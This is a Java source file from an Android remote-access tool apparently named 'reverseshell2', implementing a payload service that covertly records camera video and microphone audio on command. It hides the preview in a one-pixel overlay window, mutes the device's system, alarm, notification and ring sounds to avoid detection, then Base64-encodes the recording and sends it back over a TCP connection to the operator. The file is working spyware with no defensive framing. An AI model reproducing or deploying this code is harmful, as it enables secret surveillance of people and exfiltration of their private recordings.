package com.example.reverseshell2.Payloads;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Gravity;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.reverseshell2.MainActivity;
import com.example.reverseshell2.R;
import com.example.reverseshell2.functions;
import com.example.reverseshell2.tcpConnection;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class videoRecorder extends Service {

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera legacyCamera = null;
    private MediaRecorder mediaRecorder = null;
    static String TAG = "videoRecoderClass";
    private static final int NOTIFICATION_ID = 1234;
    private ExecutorService executor;
    
    // Camera2 API objects
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private String cameraId;

    File videoFile;
    
    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || intent.getStringExtra("ins") == null) {
            return START_NOT_STICKY;
        }

        String ins = intent.getStringExtra("ins");
        if (ins.equals("startFore")) {
            startRecordingService();
            
            String id = intent.getStringExtra("cameraid");
            if (id != null) {
                startVideo(Integer.parseInt(id), tcpConnection.out);
            } else {
                sendMessage(tcpConnection.out, "Camera ID was not provided\n");
                stopSelfAndService();
            }
        } else if (ins.equals("stopFore")) {
            videoStop(tcpConnection.out);
        }
        
        return START_STICKY;
    }
    
    private void startRecordingService() {
        // Create notification channel
        new functions(null).createNotiChannel(getApplicationContext());
        
        // Create intent for notification
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
                    PendingIntent.FLAG_IMMUTABLE);
        } else {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
        }
        
        // Build foreground notification
        NotificationCompat.Builder notificationBuilder = 
                new NotificationCompat.Builder(getApplicationContext(), "channelid")
                .setContentTitle("Video Service")
                .setContentText("Recording video in background")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setOngoing(true);
                
        // For Android 12+, update the notification as per new requirements
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            notificationBuilder
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .setCategory(Notification.CATEGORY_SERVICE);
        }
        
        Notification notification = notificationBuilder.build();
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, notification);
    }

    public void startVideo(final int cameraID, final OutputStream outputStream) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    File outputDir = getApplicationContext().getCacheDir();
                    videoFile = File.createTempFile("video", ".mp4", outputDir);
                } catch (IOException e) {
                    e.printStackTrace();
                    sendMessage(outputStream, "Error creating temporary file\n");
                    return;
                }

                // Create and configure a surface view for camera preview
                setupSurfaceView();
                
                // Mute device audio to avoid recording system sounds
                muteDeviceAudio();
                
                // Use appropriate camera API based on Android version
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    startVideoWithCamera2(cameraID, outputStream);
                } else {
                    startVideoWithLegacyCamera(cameraID, outputStream);
                }
            }
        });
    }
    
    private void setupSurfaceView() {
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(getApplicationContext());
        
        // Configure layout params based on Android version
        WindowManager.LayoutParams layoutParams;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutParams = new WindowManager.LayoutParams(
                    1, 1,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT
            );
        } else {
            layoutParams = new WindowManager.LayoutParams(
                    1, 1,
                    WindowManager.LayoutParams.TYPE_TOAST,
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT
            );
        }
        
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
        windowManager.addView(surfaceView, layoutParams);
    }
    
    private void muteDeviceAudio() {
        AudioManager audioManager = (AudioManager) getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
        if (audioManager != null) {
            audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
            audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
        }
    }
    
    private void unmuteDeivcAudio() {
        AudioManager audioManager = (AudioManager) getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
        if (audioManager != null) {
            audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
            audioManager.setStreamMute(AudioManager.STREAM_MUSIC, false);
        }
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Failed to stop background thread: " + e.getMessage());
            }
        }
    }
    
    private void startVideoWithCamera2(final int cameraID, final OutputStream outputStream) {
        startBackgroundThread();
        
        final CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        this.cameraId = String.valueOf(cameraID);
        
        try {
            // Verify the camera exists
            String[] cameraIds = cameraManager.getCameraIdList();
            if (cameraID >= cameraIds.length) {
                sendMessage(outputStream, "Invalid camera ID\n");
                stopSelfAndService();
                return;
            }
            
            // Set up MediaRecorder
            mediaRecorder = new MediaRecorder();
            setupMediaRecorder();
            
            // Open camera
            try {
                cameraManager.openCamera(String.valueOf(cameraID), new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        cameraDevice = camera;
                        try {
                            createCaptureSession(outputStream);
                        } catch (Exception e) {
                            sendMessage(outputStream, "Failed to create capture session: " + e.getMessage() + "\n");
                            releaseCamera2Resources();
                            stopSelfAndService();
                        }
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        sendMessage(outputStream, "Camera disconnected\n");
                        releaseCamera2Resources();
                    }

                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        sendMessage(outputStream, "Camera error: " + error + "\n");
                        releaseCamera2Resources();
                        stopSelfAndService();
                    }
                }, backgroundHandler);
            } catch (SecurityException e) {
                sendMessage(outputStream, "Camera permission not granted\n");
                stopSelfAndService();
            }
        } catch (CameraAccessException e) {
            sendMessage(outputStream, "Failed to access camera: " + e.getMessage() + "\n");
            stopSelfAndService();
        }
    }
    
    private void setupMediaRecorder() {
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        
        CamcorderProfile profile = CamcorderProfile.get(CamcorderProfile.QUALITY_480P);
        mediaRecorder.setProfile(profile);
        mediaRecorder.setOutputFile(videoFile.getAbsolutePath());
        mediaRecorder.setOrientationHint(90); // Most common orientation
        
        try {
            mediaRecorder.prepare();
        } catch (IOException e) {
            Log.e(TAG, "Failed to prepare MediaRecorder: " + e.getMessage());
        }
    }
    
    private void createCaptureSession(final OutputStream outputStream) throws CameraAccessException {
        Surface recorderSurface = mediaRecorder.getSurface();
        
        final List<Surface> surfaces = new ArrayList<>();
        surfaces.add(recorderSurface);
        
        cameraDevice.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
            @Override
            public void onConfigured(@NonNull CameraCaptureSession session) {
                captureSession = session;
                try {
                    // Start recording
                    mediaRecorder.start();
                    sendMessage(outputStream, "Started Recording Video\n");
                } catch (Exception e) {
                    sendMessage(outputStream, "Failed to start recording: " + e.getMessage() + "\n");
                    releaseCamera2Resources();
                    stopSelfAndService();
                }
            }

            @Override
            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                sendMessage(outputStream, "Failed to configure camera session\n");
                releaseCamera2Resources();
                stopSelfAndService();
            }
        }, backgroundHandler);
    }
    
    private void releaseCamera2Resources() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
            } catch (IllegalStateException e) {
                // Ignore; not recording
            }
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
        }
        
        stopBackgroundThread();
    }

    private void startVideoWithLegacyCamera(final int cameraID, final OutputStream outputStream) {
        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(SurfaceHolder surfaceHolder) {
                try {
                    legacyCamera = Camera.open(cameraID);
                } catch (Exception e) {
                    Log.d(TAG, "Error opening camera: " + e.getMessage());
                    sendMessage(outputStream, "Failed to open camera\n");
                    stopSelfAndService();
                    return;
                }

                mediaRecorder = new MediaRecorder();
                legacyCamera.unlock();
                mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
                mediaRecorder.setCamera(legacyCamera);
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                
                try {
                    mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_480P));
                } catch (RuntimeException e) {
                    sendMessage(outputStream, "Error initializing camera: " + e.getMessage() + "\n");
                    stopSelfAndService();
                    return;
                }
                
                mediaRecorder.setOutputFile(videoFile.getAbsolutePath());

                try {
                    mediaRecorder.prepare();
                    mediaRecorder.start();
                    sendMessage(outputStream, "Started Recording Video\n");
                } catch (Exception e) {
                    sendMessage(outputStream, "Failed to start recording: " + e.getMessage() + "\n");
                    releaseLegacyCameraResources();
                    stopSelfAndService();
                }
            }

            @Override
            public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
                // No implementation needed
            }

            @Override
            public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
                // No implementation needed
            }
        });
    }
    
    private void releaseLegacyCameraResources() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
            } catch (IllegalStateException e) {
                // Ignore; not recording
            }
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
        }
        
        if (legacyCamera != null) {
            try {
                legacyCamera.lock();
                legacyCamera.release();
                legacyCamera = null;
            } catch (Exception e) {
                // Ignore exceptions during cleanup
            }
        }
    }

    public void videoStop(final OutputStream outputStream) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        if (mediaRecorder != null) {
                            try {
                                mediaRecorder.stop();
                            } catch (IllegalStateException e) {
                                sendMessage(outputStream, "Video Service Not Started\n");
                                stopSelfAndService();
                                return;
                            }
                            releaseCamera2Resources();
                        } else {
                            sendMessage(outputStream, "Video Service Not Started\n");
                            stopSelfAndService();
                            return;
                        }
                    } else {
                        if (mediaRecorder != null) {
                            try {
                                mediaRecorder.stop();
                            } catch (IllegalStateException e) {
                                sendMessage(outputStream, "Video Service Not Started\n");
                                stopSelfAndService();
                                return;
                            }
                            releaseLegacyCameraResources();
                        } else {
                            sendMessage(outputStream, "Video Service Not Started\n");
                            stopSelfAndService();
                            return;
                        }
                    }
                    
                    if (windowManager != null && surfaceView != null) {
                        windowManager.removeView(surfaceView);
                        surfaceView = null;
                    }
                    
                    unmuteDeivcAudio();

                    if (videoFile != null && videoFile.exists() && videoFile.length() > 0) {
                        sendData(videoFile, outputStream);
                    } else {
                        sendMessage(outputStream, "Error in getting Video\n");
                        stopSelfAndService();
                    }
                } catch (Exception e) {
                    sendMessage(outputStream, "Error stopping video: " + e.getMessage() + "\n");
                    stopSelfAndService();
                }
            }
        });
    }

    public void sendData(final File file, final OutputStream outputStream) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    sendMessage(outputStream, "stopVideo123\n");
                    
                    long fileSize = file.length();
                    if (fileSize > 15000000) { // ~15MB limit to prevent memory issues
                        sendMessage(outputStream, "Video file too large to send\n");
                        stopSelfAndService();
                        return;
                    }
                    
                    int size = (int) file.length();
                    byte[] data = new byte[size];
                    
                    try (BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file))) {
                        buf.read(data, 0, data.length);
                        
                        String encodedVideo = Base64.encodeToString(data, Base64.DEFAULT);
                        outputStream.write(encodedVideo.getBytes("UTF-8"));
                        outputStream.write("END123\n".getBytes("UTF-8"));
                    } catch (IOException e) {
                        sendMessage(outputStream, "Error sending video data: " + e.getMessage() + "\n");
                    } finally {
                        if (file.exists()) {
                            file.delete();
                        }
                        stopSelfAndService();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    if (file.exists()) {
                        file.delete();
                    }
                    stopSelfAndService();
                }
            }
        });
    }
    
    private void sendMessage(final OutputStream outputStream, final String message) {
        if (outputStream == null) return;
        
        try {
            outputStream.write(message.getBytes("UTF-8"));
        } catch (IOException e) {
            Log.e(TAG, "Error sending message: " + e.getMessage());
        }
    }
    
    private void stopSelfAndService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE);
        } else {
            stopForeground(true);
        }
        stopSelf();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            releaseCamera2Resources();
        } else {
            releaseLegacyCameraResources();
        }
        
        unmuteDeivcAudio();
        
        if (windowManager != null && surfaceView != null) {
            try {
                windowManager.removeView(surfaceView);
            } catch (IllegalArgumentException e) {
                // View already removed
            }
        }
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
        
        super.onDestroy();
    }
}
